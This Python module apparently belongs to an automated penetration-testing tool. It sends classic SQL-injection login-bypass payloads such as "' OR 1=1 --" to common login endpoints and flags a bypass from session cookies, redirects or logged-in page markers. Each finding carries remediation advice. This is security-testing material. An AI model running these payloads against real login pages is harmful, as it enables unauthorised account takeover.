"""SQL-injection login bypass.

Detects classic authentication-bypass via SQL injection into the
username/email field of a login endpoint. The textbook example is

    SELECT * FROM users WHERE email = '<INPUT>' AND password = '...'

with `<INPUT>` set to ``' OR 1=1 --`` so the comment swallows the AND
clause and the SELECT returns the first user row. The server then
issues a session cookie or redirects to the authenticated landing
page despite no valid password being supplied.

The fuzzer Sqli probe (web.sqli_fuzz) only attacks GET query
parameters; this probe attacks POST login forms specifically, in
both `application/x-www-form-urlencoded` and `application/json`
shapes, and detects bypass via three signals on the attack response
that are absent from the wrong-password baseline:

  1. A Set-Cookie header carrying a session-shaped cookie name
     (``session=``, ``JSESSIONID``, ``connect.sid``, ``auth=``,
     ``_session``).
  2. A redirect (3xx) to a path that doesn't match the login route
     family (``/login``, ``/signin``, ``/auth``).
  3. A 200 body containing logged-in markers (``logout``, ``sign out``,
     ``my account``, ``dashboard``) absent in the baseline.

Severity is critical: a working bypass yields full account takeover
of whichever user row the SELECT returns first (commonly the oldest
account — frequently the admin).
"""
from __future__ import annotations

import logging
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.auth.runner import auth_headers
from engine.probes.primitives import http_post_form, http_post_json

logger = logging.getLogger("pentest-ai.probes.web.sqli_login_bypass")

DEFAULT_LOGIN_PATHS: tuple[str, ...] = (
    "/login",
    "/api/login",
    "/auth/login",
    "/api/auth/login",
    "/signin",
    "/api/signin",
    "/sessions",
    "/users/sign_in",
)

USERNAME_FIELDS: tuple[str, ...] = (
    "email",
    "username",
    "user",
    "login",
)

PASSWORD_FIELDS: tuple[str, ...] = (
    "password",
    "pass",
    "passwd",
)

# Payloads picked for breadth across SQLite/Postgres/MySQL/MSSQL
# comment-syntax and quote-escape conventions. Each one comments
# out the trailing AND password clause.
BYPASS_PAYLOADS: tuple[str, ...] = (
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "admin' OR 1=1 --",
    "' OR 'x'='x' --",
    "') OR ('1'='1",
)

DUMMY_PASSWORD = "ptai-canary-9f3b2a-not-a-real-password"

# Cookie-name fragments that strongly suggest a session was minted.
_SESSION_COOKIE_MARKERS: tuple[str, ...] = (
    "session=",
    "_session=",
    "sessionid=",
    "JSESSIONID=",
    "connect.sid=",
    "auth=",
    "token=",
    "access_token=",
)

# Body fragments that only appear when the response renders a
# logged-in shell (dashboards, account pages). Case-insensitive.
_LOGGED_IN_MARKERS: tuple[str, ...] = (
    "logout",
    "log out",
    "sign out",
    "my account",
    "dashboard",
    "welcome,",
)

# Path fragments that mark a login family — a redirect BACK to one
# of these is the normal failed-auth response and is NOT a bypass.
_LOGIN_PATH_FRAGMENTS: tuple[str, ...] = (
    "/login",
    "/signin",
    "/sign_in",
    "/auth",
    "/sessions/new",
)


def _location_indicates_bypass(location: str) -> bool:
    """A 3xx Location pointing to a non-login path implies session minted."""
    if not location:
        return False
    loc_lc = location.lower()
    return not any(frag in loc_lc for frag in _LOGIN_PATH_FRAGMENTS)


def _has_new_session_cookie(
    attack_headers: dict[str, str], baseline_headers: dict[str, str],
) -> str | None:
    """Return the Set-Cookie value if attack got a session cookie baseline didn't."""
    a_cookie = attack_headers.get("Set-Cookie", "") or attack_headers.get("set-cookie", "")
    b_cookie = baseline_headers.get("Set-Cookie", "") or baseline_headers.get("set-cookie", "")
    if not a_cookie:
        return None
    for marker in _SESSION_COOKIE_MARKERS:
        if marker in a_cookie and marker not in b_cookie:
            return a_cookie[:200]
    return None


def _has_new_logged_in_marker(attack_body: str, baseline_body: str) -> str | None:
    a_lc = attack_body.lower()
    b_lc = baseline_body.lower()
    for marker in _LOGGED_IN_MARKERS:
        if marker in a_lc and marker not in b_lc:
            return marker
    return None


def _classify(
    a_status: int,
    a_headers: dict[str, str],
    a_body: str,
    b_status: int,
    b_headers: dict[str, str],
    b_body: str,
) -> tuple[str, str] | None:
    """Return (signal_kind, evidence_snippet) if attack proves bypass, else None."""
    # 3xx redirect to a non-login path: classic Flask/Rails post-login flow.
    if 300 <= a_status < 400:
        location = a_headers.get("Location", "") or a_headers.get("location", "")
        if _location_indicates_bypass(location):
            return "redirect_to_authed_page", f"Location: {location[:200]}"

    cookie_hit = _has_new_session_cookie(a_headers, b_headers)
    if cookie_hit is not None:
        return "session_cookie_minted", f"Set-Cookie: {cookie_hit}"

    if a_status == 200 and b_status != 200:
        marker = _has_new_logged_in_marker(a_body, b_body)
        if marker is not None:
            return "logged_in_marker", f"response body contained {marker!r}"
        # Pure status flip 401->200 is enough evidence even without markers.
        return "status_flip_to_200", f"baseline {b_status} vs attack {a_status}"

    if a_status == 200 and b_status == 200:
        marker = _has_new_logged_in_marker(a_body, b_body)
        if marker is not None:
            return "logged_in_marker", f"response body contained {marker!r}"

    return None


def _emit(target: str, payload: str, username_field: str, signal: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"SQLi login bypass on {target} via {username_field}={payload!r}",
        "severity": "critical",
        "category": "injection",
        "target": target,
        "evidence": f"signal={signal} :: {evidence[:300]}",
        "bug_class": "sqli",
        "owasp": "A07:2021",
        "remediation": (
            "Use parameterised queries for the credentials lookup. Never "
            "interpolate user input into the WHERE clause. Even with hashed "
            "passwords, an injectable email field bypasses the entire auth "
            "check. Pair with rate-limiting and a generic error message."
        ),
    }


async def _post_login(
    session: Any,
    url: str,
    username_field: str,
    password_field: str,
    username_value: str,
    shape: str,
    extra: dict[str, str],
) -> tuple[int, dict[str, str], str]:
    payload = {username_field: username_value, password_field: DUMMY_PASSWORD}
    if shape == "form":
        # allow_redirects=False so we can see the 302 directly.
        return await http_post_form(
            session, url, payload,
            headers=extra or None, allow_redirects=False,
        )
    return await http_post_json(session, url, payload, headers=extra or None)


@registry.probe(
    name="web.sqli_login_bypass",
    bug_class="sqli",
    severity_max="critical",
    owasp="A07:2021",
    runtime_budget_s=20.0,
    tags=("anonymous", "high-roi", "auth"),
    requires_auth=False,
)
async def probe_sqli_login_bypass(ctx: ProbeContext) -> list[dict[str, Any]]:
    """POST classic SQLi bypass payloads at login endpoints; detect minted session."""
    candidates = list(dict.fromkeys(
        list(DEFAULT_LOGIN_PATHS) + list(ctx.candidate_endpoints or ())
    ))
    base = ctx.base.rstrip("/")
    extra = auth_headers(ctx.captured_auth)
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    for path in candidates:
        url = path if path.startswith(("http://", "https://")) else base + path
        if url in seen:
            continue

        fired_here = False
        for shape in ("form", "json"):
            if fired_here:
                break
            # Baseline: shape-specific POST with the most common field
            # names and a definitely-invalid email. This is the failed-
            # login response we'll compare attack responses against.
            b_status, b_headers, b_body = await _post_login(
                ctx.session, url, "email", "password",
                "nonexistent-ptai@invalid.local", shape, extra,
            )
            if b_status in (0, 404, 405):
                continue

            for username_field in USERNAME_FIELDS:
                if fired_here:
                    break
                for password_field in PASSWORD_FIELDS[:2]:  # password / pass
                    if fired_here:
                        break
                    for payload in BYPASS_PAYLOADS:
                        a_status, a_headers, a_body = await _post_login(
                            ctx.session, url, username_field, password_field,
                            payload, shape, extra,
                        )
                        signal = _classify(
                            a_status, a_headers, a_body,
                            b_status, b_headers, b_body,
                        )
                        if signal is None:
                            continue
                        kind, evidence = signal
                        findings.append(_emit(
                            url, payload, username_field, kind, evidence,
                        ))
                        seen.add(url)
                        fired_here = True
                        break

    return findings
